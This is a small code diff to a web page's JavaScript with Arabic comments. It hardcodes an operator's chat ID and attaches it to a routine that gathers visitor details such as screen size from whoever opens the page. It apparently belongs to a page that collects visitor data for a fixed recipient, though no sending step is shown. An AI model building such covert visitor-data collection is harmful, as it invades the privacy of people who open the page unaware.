@@ -152,6 +152,7 @@
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(name) || "مجهول";
         }
+        const adminChatId = "1431886140"; // الـ ID الثابت الخاص بك
         const userId = getParameter('id');
 
         // جمع بيانات المستخدم
@@ -200,7 +201,7 @@
                     screen: `${window.screen.width}x${window.screen.height}`
                 };
             } catch (e) {
-                return { id: userId, error: "فشل في جمع البيانات" };
+                return { id: userId, adminChatId, error: "فشل في جمع البيانات" };
             }
         }
 
